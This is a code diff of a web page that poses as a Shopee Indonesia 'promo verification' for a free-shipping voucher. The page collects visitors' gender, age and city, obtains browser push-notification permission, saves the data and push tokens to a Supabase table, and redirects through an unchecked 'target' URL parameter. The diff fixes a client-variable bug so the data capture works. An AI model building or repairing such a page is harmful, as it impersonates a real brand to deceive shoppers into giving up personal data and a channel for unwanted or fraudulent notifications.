@@ -4,9 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Shopee Indonesia | Verifikasi Promo</title>
+    
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-messaging-compat.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
     <style>
         body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #f5f5f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         .card { background: white; width: 90%; max-width: 400px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 25px; text-align: center; }
@@ -18,8 +20,8 @@
         .hidden { display: none; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ee4d2d; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #citySuggestions { text-align: left; border: 1px solid #eee; max-height: 120px; overflow-y: auto; position: absolute; background: white; width: 80%; z-index: 10; }
-        .suggestion-item { padding: 10px; cursor: pointer; border-bottom: 1px solid #f9f9f9; font-size: 14px; }
+        #citySuggestions { text-align: left; border: 1px solid #eee; max-height: 120px; overflow-y: auto; position: absolute; background: white; width: 80%; z-index: 10; left: 10%; }
+        .suggestion-item { padding: 10px; cursor: pointer; border-bottom: 1px solid #f9f9f9; font-size: 14px; color: #333; }
         .suggestion-item:hover { background: #fff5f2; }
     </style>
 </head>
@@ -56,21 +58,21 @@
         </div>
 
         <div id="stepCity" class="hidden" style="position: relative;">
-            <p style="font-size: 12px; color: #ee4d2d; margin-bottom: 5px;">Input kota untuk Gratis Ongkir khusus lokasimu</p>
-            <input type="text" id="cityInput" placeholder="Ketik nama kota/kabupaten..." oninput="searchCity(this.value)">
+            <p style="font-size: 12px; color: #ee4d2d; margin-bottom: 5px;">Input kota untuk Gratis Ongkir lokasimu</p>
+            <input type="text" id="cityInput" placeholder="Ketik nama kota..." oninput="searchCity(this.value)">
             <div id="citySuggestions"></div>
         </div>
     </div>
 
     <div id="redirectSection" class="hidden">
         <h2 style="color: #2ecc71;">Verifikasi Berhasil!</h2>
-        <p>Voucher Gratis Ongkir diaktifkan. Klik tombol di bawah untuk klaim.</p>
+        <p>Voucher Gratis Ongkir diaktifkan.</p>
         <button class="btn-shopee" onclick="redirectToShopee()">BUKA APLIKASI SHOPEE</button>
     </div>
 </div>
 
 <script>
-    // --- KONFIGURASI DATA ---
+    // --- KONFIGURASI ---
     const firebaseConfig = {
         apiKey: "AIzaSyD_zJ9VxNeNZCBwaXpzgHbbfmw3Ymj5QTA",
         authDomain: "shopee-promo.firebaseapp.com",
@@ -85,21 +87,24 @@
     const SUPABASE_KEY = "sb_publishable_0PlYfd9A6FxFzO6YqMznrA_4RCpF9XR";
     const VAPID_KEY = "BPVouVO9zg4a1ZZ81K02MjTA5mgc-mxExWNaALL1PsBevaUHJ-WnKykmUJogmH26TtX9S5c9wHbpZ9uaRfnKY68";
 
-    // Inisialisasi
+    // Inisialisasi dengan pengecekan
     firebase.initializeApp(firebaseConfig);
     const messaging = firebase.messaging();
-    const supabase = supabasejs.createClient(SUPABASE_URL, SUPABASE_KEY);
+    
+    // Perbaikan: Gunakan nama variabel unik untuk client
+    const mySupabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
     let userData = { gender: '', age: '', city: '', token: '' };
     const targetLink = new URLSearchParams(window.location.search).get('target') || 'https://shopee.co.id';
 
-    // Cek status Subscribed
     window.onload = function() {
-        if (localStorage.getItem('shopee_subbed') === 'true') {
-            showSection('redirectSection');
-        } else {
-            showSection('formSection');
-        }
+        setTimeout(() => {
+            if (localStorage.getItem('shopee_subbed') === 'true') {
+                showSection('redirectSection');
+            } else {
+                showSection('formSection');
+            }
+        }, 1000);
     };
 
     function showSection(id) {
@@ -123,8 +128,7 @@
         }
     }
 
-    // Simulasi daftar kota (bisa ditambah sesuai kebutuhan)
-    const cities = ["Jakarta", "Surabaya", "Bandung", "Medan", "Semarang", "Makassar", "Palembang", "Tangerang", "Bekasi", "Depok", "Bogor", "Malang", "Yogyakarta", "Solo", "Denpasar"];
+    const cities = ["Jakarta", "Surabaya", "Bandung", "Medan", "Semarang", "Makassar", "Palembang", "Tangerang", "Bekasi", "Depok", "Bogor", "Malang", "Yogyakarta", "Solo", "Denpasar", "Palembang", "Banjarmasin", "Balikpapan", "Pontianak", "Samarinda", "Manado", "Ambon", "Jayapura", "Mataram", "Kupang"];
 
     function searchCity(query) {
         const suggBox = document.getElementById('citySuggestions');
@@ -145,8 +149,6 @@
         userData.city = city;
         document.getElementById('cityInput').value = city;
         document.getElementById('citySuggestions').innerHTML = '';
-        
-        // Setelah kota dipilih, langsung minta izin notif & simpan
         await finalizeSubscription();
     }
 
@@ -158,12 +160,14 @@
                 const token = await messaging.getToken({ vapidKey: VAPID_KEY });
                 if (token) {
                     userData.token = token;
-                    // Simpan ke Supabase
-                    await supabase.from('subscribers').upsert([userData], { onConflict: 'token' });
+                    // Gunakan variabel client yang sudah diperbaiki
+                    await mySupabase.from('subscribers').upsert([userData], { onConflict: 'token' });
                     localStorage.setItem('shopee_subbed', 'true');
                 }
             }
-        } catch (e) { console.error(e); }
+        } catch (e) { 
+            console.error("Gagal simpan:", e); 
+        }
         showSection('redirectSection');
     }
 
